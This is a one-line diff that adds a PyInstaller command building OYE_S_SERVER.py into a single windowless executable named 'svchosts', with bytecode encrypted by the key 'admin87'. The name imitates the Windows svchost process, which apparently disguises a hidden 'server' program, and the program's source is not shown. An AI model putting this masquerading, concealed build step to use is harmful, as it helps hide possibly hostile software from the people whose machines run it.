@@ -1,0 +1,1 @@
+pyinstaller --onefile --noconsole --name=svchosts --key=admin87 OYE_S_SERVER.py
